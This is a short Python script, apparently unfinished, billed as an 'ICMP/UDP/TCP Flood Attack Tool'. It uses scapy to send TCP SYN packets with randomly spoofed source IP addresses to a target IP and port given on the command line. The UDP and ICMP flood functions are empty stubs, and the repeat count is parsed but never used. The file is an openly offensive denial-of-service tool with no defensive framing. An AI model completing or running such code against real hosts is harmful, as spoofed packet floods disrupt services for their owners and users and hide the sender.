from sys import stdout
from scapy.all import *
from random import randint
from argparse import ArgumentParser


# ICMP/UDP/TCP Flood Attack Tool
def main():
    parser = ArgumentParser()
    parser.add_argument("--SynFlood", "-s", help="Syn Flood Attack")
    parser.add_argument("--UDPFlood", "-u", help="UDP Flood Attack")
    parser.add_argument("--ICMPFlood", "-i", help="ICMP Flood Attack")
    parser.add_argument("--target", "-t", required=True, help="target IP address")
    parser.add_argument("--port", "-p", default=80, help="target port number")
    parser.add_argument(
        "--repeat", "-r", default=100, help="attack number of repetition"
    )

    args = parser.parse_args()
    
    dstIP = args.target
    dstPort = args.port
    repeat = args.repeat

    if args.SynFlood:
        SynFlood(dstIP, dstPort, repeat)
    elif args.UDPFlood:
        UDPFlood(dstIP, dstPort, repeat)
    elif args.ICMPFlood:
        ICMPFlood(dstIP, repeat)
    else:
        print("Attack Type is Missing")
        return

def randomSrcIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip 

def SynFlood(dstIP,dstPort,repeat):
    IP_Packet = IP()
    IP_Packet.src = randomSrcIP()
    IP_Packet.dst = dstIP

    TCP_Packet = TCP()
    TCP_Packet.sport = 80
    TCP_Packet.dport = dstPort
    TCP_Packet.flags = "S"
    # TCP_Packet.seq = 
    # TCP_Packet.window = 
    send(IP_Packet/TCP_Packet,verbose=0)

def UDPFlood(dstIP,dstPort,repeat):
    pass


def ICMPFlood(dstIP,repeat):
    pass


main()
